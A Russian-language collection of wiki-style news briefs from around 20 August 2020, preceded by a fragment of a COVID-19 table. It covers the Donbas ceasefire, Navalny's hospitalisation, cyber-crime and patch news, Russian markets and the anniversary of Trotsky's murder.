|style="text-align:right"| ||Карибские Нидерланды|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Фолклендские острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ватикан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Британские Виргинские острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Западная Сахара|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||MS Zaandam || ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сен-Пьер и Микелон|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ангилья|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Китай|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|}
 
 
 
Источники
*

В Советске в начале недели неизвестные подожгли памятник первым переселенцам на улице Первомайской. Об этом сообщаетРЕН ТВсо ссылкой на администрацию города.
По данным телеканала,  к происшествию могут быть причастны дети, решившие таким образом поиграть. Огонь, предположительно, был разведён в топке и распространился на всё машинное отделение. Тушить памятник пришлось пожарным.
Выходка хулиганов материального ущерба не нанесла. В происшествии никто не пострадал.
Памятник первым переселенцам посвящён людям, переехавшим в 1945-1950 годах в Калининградскую область. В 2015 году рядом с паровозом установили скульптурную композицию. Монумент изображает семью — отца, мать и ребёнка, которые сошли с поезда.
 
Источники

За прошедшие сутки по всей линии разграничения на Донбассе были зафиксированы 3 случая нарушения договоренностей, достигнутых в рамках заседаний Трехсторонней контактной группы.
Об этом сообщает RegioNews со ссылкой на штаб ООС.
Огневую активность боевиков зафиксировали вблизи Луганского и дважды возле Попасной. Стреляли из стрелкогово оружия, во всех случаях одиночные выстрелы были провокационными и не несли угрозы жизни воинам ВСУ, поэтому украинские защитники оружие в ответ не применяли.
 
С начала текущих суток, 20 августа, на всех участках фронта наблюдается тишина, нарушения режима прекращения огня не зафиксированы.
Напомним, сутками ранее по всей линии разграничения не было зафиксировано провокаций и обстрелов со стороны вооруженных формирований боевиков.
 
Источники

Председателю Херсонского областного совета Владиславу Мангеру и бывшему помощнику депутата Алексею Левину Днепровский районный суд Киева продлил содержание под стражей еще на два месяца.
Как передает RegioNews, об этом сообщила судья во время заседания, которое транслировалось в Facebook.
Указанные лица не смогут внести залог, а сам арест будет продлен до 18 октября 2020 года включительно.
Также суд назначил обвинительный акт по делу об убийстве херсонской активистки Екатерины Гандзюк к рассмотрению 28 августа в 14:00.
Напомним, херсонскую активистку и чиновницу Екатерину Гандзюк облили серной кислотой 31 июля 2018 года. Девушка погибла в больнице через три месяца. В Офисе генпрокурора считают, что Гандзюк заказал Владислав Магнер.
11 июня стало известно, что Владислав Мангер планирует баллотироваться в Херсонскую областную советову.
12 июня Печерский районный суд Киева разрешил осуществить принудительный привод главы Херсонского областного совета Владислава Мангера. Также Печерский районный суд Киева 15 июня принял решение о предоставлении разрешения на его задержание.
16 июня, сотрудники Службы безопасности Украины задержали председателя Херсонского областного совета Владислава Мангера для доставки в суд. Адвокат Мангера Дмитрий Ильченко, комментируя решение суда, заявил о намерении обратиться в Европейский суд по правам человека.
В тот же день защита головы Херсонского облсовета Владислава Мангера во время заседания по избранию меры пресечения заявил об отводе судьи, поэтому заседание отложили, а самого Мангера отпустили.17 июня, временная следственная комиссия обнаружила недостатки в расследовании дела Гандзюк.
Ранее сообщалось, что суд рассматривает дело Мангера по существу.
 
Источники

В Омске экстренно госпитализировали Навального с подозрением на токсическое отравление. Блогера в бессознательном состоянии сняли с борта самолёта, на котором он возвращался из Томска в Москву, сообщает "РИА Новости" в четверг, 20 августа.
Навальному стало плохо в полёте, из-за этого воздушное судно село в Омске. В тяжёлом состоянии блогера доставили в реанимацию и подключилик аппарату искусственной вентиляции лёгких. По предварительным данным, у него диагностировано острое отравление неустановленным психодиcлептиком, сообщает со ссылкой на источник Telegram-канал Life Shot.
В свою очередь, пресс-секретарь Навального Кира Ярмыш предположила, что блогера могли отравить. Она заявила, что Навальный с утра пил лишь чай.
Мы предполагаем, что Алексея отравили чем-то, подмешанным в чай. Это было единственное, что он пил с утра. Врачи говорят, что токсин быстрее всосался через горячую жидкость. Сейчас Алексей без сознания
 
Источники

По результатам нового заседания Трехсторонней контактной группы касательно ситуации на Донбассе удалось договорится по четырем новым участкам разведения сил и средств на Донбассе. 
Об этом сообщает RegioNews со ссылкой на пресс-службу президента Украины.
Помимо этого, ТКГ были достигнуты договоренности по 20 участках разминирования, а украинская сторона поддержала необходимость разработки рамочного решения ТКГ по противоминной деятельности, что поможет оптимизировать дальнейшую работу по этому вопросу.
Также стороны достигли соглашения относительно списков удерживаемых лиц, готовящихся к обмену. Украинская сторона в очередной раз подчеркнула выполнение всех договоренностей о подтверждении списков для взаимного освобождения удерживаемых лиц и подтвердила информацию о лицах, которую спрашивали участники консультаций.
Сообщается, что достигнутые решения позволят продвинуться в выполнении договоренностей лидеров «нормандского» формата, достигнутых в Париже, и приблизиться к проведению саммита «нормандской четверки» в Берлине.
Отмечается, что заседание ТКГ проходило в формате видеоконференции. Украинскую делегацию возглавлял первый президент Украины Леонид Кравчук, а также заместитель главы делегации Витольд Фокин.
Напомним, глава украинской делегации в ТКГ по Донбассу Леонид Кравчук заявил, что первое заседание состоится 18 августа в формате видеоконференции. Он также допустил возможность поиска нового места для переговоров.
Также Кравчук предлагает отказаться от понятия «особый статус» для ОРДЛО, потому что якобы понятие «особый статус» противоречит украинскому законодательству.
 
Источники

Команда Kali Linux использовала всю мощь подсистемы Windows для Linux 2 (WSL2) для создания графической среды рабочего стола, которая отображается непосредственно в Windows. Когда была выпущена подсистема Windows для Linux, в ней использовалось Linux-совместимое ядро, переводившее системные вызовы Linux в вызовы, которые могли выполняться ядром Windows.
С выпуском подсистемы Windows для Linux 2 ядро ​​Linux теперь запускается поверх архитектуры виртуализации Microsoft Hyper-V. Помимо обеспечения собственной совместимости и повышения производительности, WSL2 также позволяет запускать исполняемые файлы Windows непосредственно из установленного дистрибутива WSL Linux.
Команда Kali Linux разработала пакет под названием Win-Kex, который создает клиент Windows VNC, подключенный к графической среде рабочего стола Xfce.
Для начала работы с Win-Kex пользователю необходимо установить подсистему Windows для Linux и работать в Windows 10 версии 2004. После установки WSL необходимо установить Kali Linux из Microsoft Store, но не запускать его. Затем следует подтвердить, что Kali Linux использует WSL версии 2, введя специальную команду в командной строке (wsl -l -v).
Если данная команда определяет Kali Linux как версию 1, необходимо сначала обновить ее до версии 2, используя команду wsl --set-версия kali-linux 2. Также следует загрузить и установить последнюю версию ядра Linux.
Как только система будет подготовлена, пользователь может использовать команду kex для доступа к рабочему столу Kali Linux GUI. Win-Kex делает это, запуская VNCServer со средой рабочего стола Xfce в экземпляре Kali Linux WSL. Затем он запускает клиент TigerVNC Windows и автоматически передает команды для подключения к серверу VNC.
Для запуска VNCServer и автоматического подключения к нему через TigerVNC пользователю достаточно просто ввести kex, и рабочий стол Kali Linux автоматически запустится в Windows. Оттуда можно запускать любые инструменты тестирования на проникновение или исследования прямо с рабочего стола с графическим интерфейсом пользователя, работающего в Windows.
 
Источники

За два года хакеры похитили персональные данных граждан Великобритании, США, стран Европы и СНГ для продажи на ресурсах DarkNet, отметили в ведомстве
Служба безопасности Украины совместно с правоохранительными органами Великобритании блокировали деятельность международной хакерской группировки. Об этом сообщает пресс-служба СБУ.
"Группировка действовала с 2018 года и специализировалась на похищении персональных данных граждан Великобритании, США, стран Европы и СНГ для продажи на ресурсах DarkNet", - отметили в ведомстве.
Британские правоохранители сообщили, что один из участников группировки живет в Украине. Хакер разрабатывал и продавал на специализированных сайтах вирусные программы для незаконного доступа к компьютерам по всему миру, пишет СБУ.
По данным следствия, с помощью вредоносной программы хакеры похищали логины и пароли от интернет-сайтов, электронных почтовых ящиков, данные кредитных карт и электронных кошельков граждан. Затем информацию использовали для создания бот-сетей, DDoS-атак, похищения средств и персональной информации граждан.
Во время обысков в украинского хакера изъяли более 20 терабайт информации со взломанных компьютеров и исходные коды разработанного им вируса. Мужчине сообщили подозрение по ч. 1 ст. 361-2 (несанкционированный сбыт или распространение информации с ограниченным доступом, которая хранится в компьютерах) УК.
Правоохранители Великобритании задержали его сообщника, который уже отбывает тюремное заключение за преступления в сфере кибербезопасности.
 
Источники

Национальный координационный центр кибербезопасности (НКЦК) при СНБО обнаружил признаки подготовки к масштабной атаки на органы государственной власти и объекты критической инфраструктуры накануне Дня Независимости и во время подготовки к местным выборам.
Об этом сообщается на официальной странице Совета национальной безопасности и обороны Украины в Facebook.
В НКЦК предупреждают об активизации хакерской группировки «Gamaredon», за которой якобы стоят спецслужбы Российской федерации. Специалисты по кибербезопасности выявили модернизацию программных средств кибератак, которые могут преодолеть средства защиты.
Отмечено, что серьезная скоординированная кибератака готовилась ко Дню Независимости Украины, который страна будет отмечать 24 августа. Атаке должны были подвергнуться стать объекты критической инфраструктуры.
«Во время последних попыток атак используются вредоносные вложения, которые имитируют документы государственных органов власти, в частности, Службы безопасности Украины. Преступники рассылают вредоносные документы по электронной почте, и во время их открытия хакеры получают доступ к системам и сетям государственного учреждения», — сообщили в СНБО.
Ранее специалисты Eset выявили связь группировки InvisiMole с Gamaredon, известной своими атаками на украинские организации. Группировка InvisiMole была обнаружена только в 2018 году, хотя атаковала организации в России и Украине с целью кибершпионажа еще в 2013 году. На некоторое время злоумышленники исчезли с радаров, но недавно вернулись снова с обновленным хакерским арсеналом и новыми тактиками. InvisiMole была нацелена на военные и дипломатические организации в странах Восточной Европы с целью шпионажа.
 
Источники

Прокуроры Раздельнянской местной прокуратуры направили в суд обвинительный акт в отношении фигурантки, по факту завладения бюджетными средствами в размере около 300 тыс. гривен.
Об этом сообщает RegioNews со ссылкой на пресс-службу прокуратуры региона.
Установлено, что на протяжении 2016-2018 годов начальник отдела предоставления социальных пособий и компенсаций управления социальной защиты населения одной из райгосадминистраций Одесской области, злоупотребляя предоставленными полномочиями, завладела около 300 тыс грн, предназначенными на выплату государственной соцпомощи на детей, находящихся под опекой или попечительством.
Служащий, путем вмешательства в автоматизированную систему, к которой имела доступ, оформила лицевой счет на местную жительницу, которая не имела законных оснований для получения указанных выплат, и почти ежемесячно незаконно перечисляла деньги на него.
 
Досудебное расследование в уголовном производстве осуществляли следователи Великомихайловского отделения полиции.
За такое преступление по ч. 4 ст. 191 УК Украины предусмотрено до 8 лет лишения свободы.
Напомним, СБУ разоблачила межрегиональную группу, которая выводила в тень миллионы гривен госпредприятий. Ежемесячно банда "отмывала" почти полмиллиарда гривен.
 
Источники

Повторное тестирование на COVID-19 у 72 членов экипажа траулера "Карелия" заболевания не выявило. Об этом сообщили в оперативном штабе по контролю за инфекцией в четверг, 20 августа.
"С 21 августа карантинные мероприятия в отношении судоэкипажа траулера отменены. Управлением Роспотребнадзора по Калининградской области разрешена свободная практика в порту Калининград", — говорится в сообщении.
В оперштабе добавили, что двое ранее заболевших уже выздоровели. Их выписали из инфекционной больницы.
В начале августа в рыбном порту Калининграда пришвартовался траулер "Карелия" с моряками, у которых подозревали COVID-19. Информация о людях и судне — в материале "Клопс".
 
Источники

]]
Председатель Европейской комиссии Урсула фон дер Ляйен заявила, что Евросоюз готов выделить €53 млн для поддержки Беларуси «в это трудное время».
Деньги планируют выделить гражданскому обществу Беларуси и уязвимым группам людей.
19 августа прошёл саммит глав стран-участниц ЕС, посвященный Беларуси. Участники саммита не признали результаты выборов президента Беларуси и решили ввести санкции в отношении беларуских чиновников за силовой разгон участников акций протеста.
По официальным данным ЦИК Беларуси, на президентских выборах 9 августа победил Александр Лукашенко, набравший 80,1 % голосов. Кандидат объединённой оппозиции Светлана Тихановская, по версии ЦИК, стала второй с 10,1 % голосов. Все участники выборов, кроме Лукашенко, не признали итоги голосования. С 9 августа в стране проходят массовые протесты против фальсификации выборов и Александра Лукашенко.
 
Источники

Компания Microsoft выпустила внеплановое обновление KB4578013, исправляющее две уязвимости повышения привилегий в сервисе удаленного доступа (Windows Remote Access).
Проблемы ( CVE-2020-1530 и CVE-2020-1537 ) связаны с некорректной обработкой WRA объектов в памяти и операций с файлами. Уязвимости затрагивают версии Windows 8.1, Windows RT 8.1 и Windows Server 2012 R2.
Воспользовавшись указанными уязвимостями, злоумышленник может повысить права на системе с помощью вредоносного приложения, правда, для этого ему нужно сначала получить возможность выполнения кода, отметила Microsoft.
Пользователям Windows 8.1 или Server 2012 R2 рекомендуется установить обновление как можно скорее, пользователям остальных версий Windows или Windows Server не требуется предпринимать никаких действий, поскольку патчи для CVE-2020-1530 и CVE-2020-1537 уже были включены в пакет обновлений, выпущенный 11 августа.
В августе Microsoft исправила 120 уязвимостей, включая две уязвимости нулевого дня, одна из которых эксплуатировалась злоумышленниками с 2018 года.
 
Источники

Совет директоров "Селигдара" рекомендовал общему собранию акционеров утвердить устав компании в новой редакции, содержащий изменения в части определения размера дивиденда по привилегированным акциям. Об этом говорится в материалах эмитента.
Внеочередное общее собрание акционеров пройдет 24 сентября 2020 года. Закрытие реестра для участия &ndash; 31 августа.
Действующая дивидендная политика "Селигдара" предусматривает выплату владельцам привилегированных акций ежегодного фиксированного дивиденда в размере 2,25 рубля на бумагу.
 
Источники

За сутки, 19 августа, заразились коронавирусом 2 134 человек, умерли 40 пациентов, были госпитализированы 407 человек.
Об этом сообщает Министерство здравоохранения, передает RegioNews.
 
Наибольшее число выявленных случаев Covid-19 за сутки зафиксировано в Харьковской области - 242, в Киеве - 227, в Черновицкой области - 189, во Львовской - 183, в Ивано-Франковской - 168.
Ситуация в регионах выглядит следующим образом: 
Винницкая область - 3405 случаев;
 
Волынская область - 4929 случаев;
 
Днепропетровская область - 1873 случая;
 
Донецкая область - 1156 случаев;
 
Житомирская область - 2597 случаев;
 
Закарпатская область - 6662 случая;
 
Запорожская область - 1213 случаев;
 
Ивано-Франковская область - 7290 случаев;
 
Кировоградская область - 749 случаев;
 
г. Киев - 11 172 случаи;
 
Киевская область - 4727 случаев;
 
Львовская область - 12 631 случай;
 
Луганская область - 204 случая;
 
Николаевская область - 893 случая;
 
Одесская область - 5408 случаев;
 
Полтавская область - 594 случая;
 
Ровенская область - 8091 случай;
 
Сумская область - 1078 случаев;
 
Тернопольская область - 4116 случаев;
 
Харьковская область - 6849 случаев;
 
Херсонская область - 321 случай;
 
Хмельницкая область - 1768 случаев;
 
Черновицкая область - 8297 случаев;
 
Черкасская область - 1200 случаев;
 
Черниговская область - 1314 случаев.
Данные с временно оккупированных территорий АР Крым, Донецкой, Луганской областей и города Севастополя отсутствуют.
Напомним, 18 августа наибольшее число выявленных случаев Covid-19 за сутки зафиксировано в Харьковской области.
Читайте также: Коронавирус в Украине: хроника (обновляется)
 
Источники

MSCI объявил о результатах ребалансировки MSCI Russia 10/40. Как и ожидалось, акции "Яндекса" вошиа в четверку лидеров с удельным весом 9,44%, в то время как вес "Норникеля" снизился на 338 б.п. до 4,72%. Все изменения вступают в силу с 1 сентября.
"В верхнем сегменте мы также отмечаем вес LKOH (+ 175 б.п. до 9,44%) и GAZP (+ 179 б.п. до 9,44%), в то время как SBER RX (-33 б.п. до 6,66%) и PLZL RX (-125 б.п. до 4,72%) были урезаны. Веса MGNT LI (+ 38 б.п. до 4,72%) и FIVE RX (+ 40 б.п. до 4,72%) были увеличены, в то время как снижение веса произошло в бумагах: CHMF (-147 б.п. до 3,10%), IRAO (-93 б.п. до 3,09 %), MOEX (-169 б.п. до 3,00%), NLMK RX (-180 б.п. до 2,94%), ALRS (-161 б.п. до 2,61%), PHOR LI (-120 б.п. до 1,95%) и MAGN (-85 б.п. до 1,38%)", - прокомментировал главный стратег "ВТБ Капитала" Илья Питерский.
 
Источники

Американский ритейлер одежды L Brands представил финансовые результаты за второй квартал, в соответствии с которыми чистый убыток составил $49,6 млн или 18 центов на акцию по сравнению с прибылью в размере $37,6 млн или 14 центов на бумагу годом ранее. Заметим, что за исключением некоторых статей прибыль компании оказалась на уровне 25 центов на одну акцию, тогда как аналитики ожидали убытка в размере 38 центов на бумагу против прибыли в 24 цента на акцию годом ранее.
Продажи в минувшем квартале снизились на 20% и составили $2,32 млрд по сравнению с $2,90 млрд в аналогичном периоде 2019 года. Аналитики, в свою очередь, прогнозировали показатель на уровне $2,19 млрд. Сообщается, что продажи продукции под брендом Victoria's Secret упали на территории США и Канады на 40% г/г.
 
Источники

Предоставлять возможность приобретать авиабилеты по сниженным ценам нужно всем россиянам, льготой можно было бы воспользоваться раз в год для перелёта по стране. Об этом в беседе с "Российской газетой" высказался председатель Комитета Госдумы по физической культуре, спорту, туризму и делам молодежи Борис Пайкин
По словам депутата, комитет разрабатывает предложения по развитию внутреннего туризма. В числе прочего предлагается на законодательном уровне закрепить возможность  "частично субсидировать перелёт каждого гражданина России внутри страны".
"Россия — огромная страна, и понятное дело, добраться с запада на восток и обратно значительно дороже, чем посетить другую страну. Не каждому россиянину это по карману",  — пояснил Пайкин.
Новая мера расширит возможности россиян, они смогут чаще посещать Дальний Восток и Калининград. Жители этих регионов, в свою очередь, смогут отправляться в турпоездки в Центральную Россию, считает парламентарий.
В России туристам компенсируют часть расходов на путешествия в некоторые регионы. Их перечень можно посмотреть здесь. Как получить кешбэк за путешествие по России, узнайте из материала "Клопс".
 
Источники

Чистая прибыль "Магнита" в 1 полугодии 2020 года по МСФО увеличилась на 77,8% г/г &ndash; до 17 млрд рублей. Рентабельность чистой прибыли выросла на 78 бп &ndash; до 2,2%.
Общая выручка торговой сети выросла на 16% г/г &ndash; до 763,4 млрд рублей, сообщила компания.
Чистая розничная выручка увеличилась на 15,7% - до 744 млрд рублей.
Сопоставимые продажи (LFL) увеличились на 7,5% на фоне роста среднего чека на 13,9% и снижения трафика на 5,6%, исключая эффект високосного года в феврале.
Валовая прибыль достигла 179,5 млрд рублей, валовая маржа составила 23,5% (на 9 бп ниже г/г).
Показатель EBITDA увеличился на 23,6% - до 53,2 млрд рублей.&nbsp;Рентабельность по EBITDA выросла&nbsp;до 7%.
 
Источники

Следственный комитет возбудил уголовное дело о мошенничестве в особо крупном размере против депутата Мосгордумы от КПРФ Олега Шереметьева. Он выступал против поправок в Конституцию и за прекращение «московского дела». Об уголовном деле сообщается на сайте ведомства.
Дело возбуждено по части 4 статьи 159 УК (мошенничество в особо крупном размере).
«По данным следствия, депутат Московской городской Думы, имея умысел на хищение денежных средств из бюджета города и личное обогащение, в период с ноября 2019 по февраль 2020 года ежемесячно подготавливал и представлял в Аппарат Думы документы о премировании своего помощника в размере от 350 до 600 тыс. рублей, содержащие заведомо ложные сведения о выполнении последним заданий особой важности и сложности, а в действительности присваивал денежные средства и распоряжался ими по своему усмотрению», — заявляет СК.
По данным следствия Шереметьев причинил материальный ущербу бюджету Москвы в размере более 2 млн рублей. Сообщается, что сотрудникам правоохранительных органов «удалось пресечь противоправную деятельность фигуранта».
В настоящий момент СК проводит следственные действия. В скором времени будет решаться вопрос об избрании депутату меры пресечения.
Олег Шереметьев — один из оппозиционных депутат Московской городской думы, победивших на выборах в 2019 году. Он в том числе выступал против поправок в Конституцию, а также назначения даты голосования. Кроме того он требовал прекратить уголовное преследование по «московское дело» против участников протестов лета 2019 года.
 
Источники

COVID-19]]
В Армении 20 августа 2020 года, по состоянию на 11:00, выявлено 263 новых случая заражения коронавирусом SARS-CoV-2. Об этом сообщает Национальный центр по контролю и профилактике заболеваний Минздрава РА.
Таким образом, число случаев заболевания в стране достигло , а число активных кейсов достигло .
За сутки вылечились 250 пациентов. Общее число выздоровевших составляет .
От последствий вируса за сутки умерло 3 человека, еще 2 зараженных умерли по иным причинам. Всего летальных исходов 836 — от коронавируса, еще 251 — от других заболеваний.
За все время проведено тестов, за последние сутки — .
 
 
 
 
Источники

Городская власть Самбора Львовской области не согласна с отнесением к "красной" карантинной зоны и требует ослабить ограничения.
Как сообщает RegioNews, об этом рассказал мэр Самбора Юрий Гамар в эфире " 24 канала".
По словам городского головы, Самбор придерживается всех карантинных правил "красной зоны". Однако из-за некоторых ограничений люди "оказались на грани выживания".
 
 
Гамар пояснил, что из-за карантина город, как и вся Украина, недополучает значительную часть доходов бюджета, примерно 40 млн грн.
 
Известно, что 17 августа Самборская городская рада отказалась усиливать карантин.
Также сообщалось, что на мэра Самбора составили протокол за нарушение карантина.
 
Источники

Бывший юрист ФБР Кевин Клайнсмит признал свою вину по одному пункту обвинения в даче ложных показаний, признав, что он отредактировал электронное письмо, которое было представлено в суд по делам о наблюдении за действиями иностранных разведок.
Письмо фигурировало в ходатайстве о получении разрешения на слежку за бывшим советником предвыборного штаба Дональда Трампа Картером Пейджем в ходе расследования ФБР российского вмешательства на выборах 2016 года.
Клайнсмит четыре года работал помощником главного юрисконсульта в отделении ФБР, занимающемся вопросами национальной безопасности и законодательства, связанного с киберпространством.
В декабре 2019 года генеральный инспектор министерства юстиции Майкл Хоровиц пришел к выводу, что Клайнсмит изменил электронное письмо ЦРУ, процитированное в ходатайстве о слежке за Пейджем от 2017 года.
Это первое уголовное обвинение, вытекающее из продолжающегося расследования федерального прокурора из Коннектикута Джона Дарема, который изучает происхождение расследования действий России.
В 2019 году генеральный прокурор США Уильям Барр поручил Дарему проанализировать, как ФБР вело свое расследование российского вмешательства на президентских выборах 2016 года.
 
Источники

На стенах дома в Мексике, где 80 лет назад был жестоко убит российский революционер Лев Троцкий, до сих пор видны следы пуль, напоминая о предыдущем неудачном покушении.
«Я уже знаком со смертью», – заявил Троцкий после того нападения в своем доме в пригороде Мехико, где он провел последние годы жизни.
«Черная ненависть Сталина преследует меня через полмира», – заявил он мексиканской газете.
Несколько месяцев спустя, 20 августа 1940 года, эта цепь преследований завершилась, когда Троцкий был убит с помощью ледоруба. Убийца действовал по приказу Иосифа Сталина.
«Это было идеологическое, символическое преступление», – рассказал AFP кубинский писатель Леонардо Падура, который потратил несколько лет на исследование обстоятельств убийства для своего романа «Человек, который любил собак».
Дом Троцкого в зеленом районе Мехико Койоакан сохранили как музей. На территории комплекса находится могила революционера с памятником, на котором высечены серп и молот.
Сторожевые башни, высокие стены и следы от пуль, оставленные киллерами Сталина, дают представление о том, как провел свои последние дни один из ключевых деятелей большевистской революции.
После ссоры со Сталиным в 1920-х Троцкий был вынужден бежать в ссылку.
Марксистский революционер перебрался из Турции в Норвегию, затем во Францию, а в 1937 году высадился в Мексике, где художник-муралист Диего Ривера помог убедить правительство генерала Ласаро Карденаса предоставить ему убежище.
Удивительно, но Троцкий и Карденас никогда не встречались, хотя переписывались.
«Возможно, это было связано с обстоятельствами момента, поскольку необходимости встречаться не было», – сказал в беседе с AFP сын генерала, известный мексиканский политик Куаутемок Карденас.
Но даже на другом континенте революционер не был защищен от сталинского режима.
Троцкий и его жена пережили первое покушение 24 мая 1940 года, бросившись под кровать.
Их внук, спавший в соседней комнате, был ранен в ногу.
Инцидент побудил Троцкого усилить меры безопасности в своем доме, но их оказалось недостаточно, чтобы остановить его убийцу – Рамона Меркадера.
Испанский коммунист и тайный агент советских спецслужб, Меркадер сумел проникнуть в ближайшее окружение Троцкого.
После того, как Троцкий установил новые металлические ворота на входе в свой дом, которые контролировались охранниками, Меркадер отказался от идеи использовать огнестрельное оружие.
Вместо этого опытный альпинист остановился на ледорубе, чтобы максимизировать свои шансы на сокрытие с места преступления.
С запасным пистолетом и ножом под пальто он вошел на территорию дома и вонзил ледоруб в череп Троцкого.
Тяжелораненый Троцкий позвал на помощь, и Меркадер был схвачен.
Революционер умер в местной больнице на следующий день.
Оружие убийства позднее в том же году исчезло, но всплыло через несколько десятилетий, когда дочь полицейского выставила его на продажу, заявив, что она хранила его под кроватью много лет.
Его купил Кит Мелтон – писатель, занимающийся историей шпионажа, и теперь он выставлен в Международном музее шпионажа в Вашингтоне.
 
Источники

Российский рынок акций начал сессию четверга в минусе. РТС потерял 0,86%, индекс МосБиржи упал на 0,58% до 3038,89 п. Доллар вырос до 73,48 рубля. Евро перевалил за отметку 87 рублей.
Внешний фон сложился негативный. Торги в Азии проходят в минусе, реагируя на динамику площадок США, которые вчера закрылись падением после публикации протоколов заседания ФРС. Документ отразил мнение чиновников, согласно которому пандемия сильно влияет на экономику и представляет риски в среднесрочной перспективе. Нефть дешевеет на опасениях по поводу спроса.
Акции "Полюса" прибавили 0,8%, вчера акционеры одобрили финальные дивиденды&nbsp;в размере 244,75 рубля на акцию. Продолжают дорожать бумаги "Яндекса" (+0,6%) и Mail.ru Group (+0,67%).&nbsp;MSCI объявил о результатах ребалансировки MSCI Russia 10/40. Как и ожидалось, акции "Яндекса" вошли в четверку лидеров с удельным весом 9,44%, в то время как вес "Норникеля" снизился на 338 б.п. до 4,72%. Все изменения вступают в силу с 1 сентября. Бумаги ГМК падают на 1,5%.
Среди лидеров падения "префы" "Ростелекома" (-5,9%), "Роснефти" (-1,1%), "префы" "Татнефти" (-0,8%), МТС (-0,82%).
Акции "Сбербанка" дешевеют на 0,62%, вчера бумаги банка выросли после новостей о том, что 21 августа будет принято решение о выплате дивидендов за 2019 год.
Чистая прибыль "Магнита" в 1 полугодии 2020 года по МСФО увеличилась на 77,8% г/г — до 17 млрд рублей. Чистая розничная выручка увеличилась на 15,7% - до 744 млрд рублей. Отчетность пока не помогает бумагам, они вместе с рынком падают на 0,7%.
Котировки Brent&nbsp;теряют 0,8% и находятся к моменту на отметке $45,01. Инвесторы обратили внимание и&nbsp;на новости от&nbsp;ОПЕК+. Как заявил в&nbsp;среду министр энергетики РФ Александр Новак по&nbsp;итогам заседания министерского мониторингового комитета ОПЕК+, мировой спрос на&nbsp;нефть восстановился до&nbsp;90% от&nbsp;докризисного уровня. Участники встречи отметили, что темпы восстановления мирового спроса оказались медленнее, чем ожидалось, сделав акцент на все еще остающихся рисках, связанных с COVID-19. Следующее заседание министерского мониторингового комитета стран ОПЕК+ пройдет 17 сентября.
Торги в США завершились небольшим снижением. Руководители Федеральной резервной системы в ходе июльского заседания отмечали высокую неопределенность в отношении перспектив экономики США в связи с пандемией коронавируса, свидетельствует протокол заседания Федерального комитета по операциям на открытом рынке 28-29 июля. Участники заседания высказали мнение о том, что американской экономике, вероятно, понадобится дополнительная поддержка, однако не определились с тем, когда им стоит начать использование новых инструментов. Представители FOMC сошлись во мнении, что "дальнейшие перспективы экономики США в значительной степени зависят от эпидемиологической ситуации, а также мер, принимаемых государством для сдерживания распространения коронавирусной инфекции". В частности, были высказаны опасения, что новые волны COVID-19 могут привести к затягиванию периода низкой экономической активности в США. Также регулятор дал ориентир по динамике ключевой ставки, которая останется неизменной до конца 2021 года. Тем временем, спикер Палаты представителей Нэнси Пелоси заявила, что Демократическая партия готова пойти на уступки для промежуточного согласования нового пакета мер стимулирования экономики в размере $500 млрд, что позволит поддержать экономику до ноябрьских выборов.
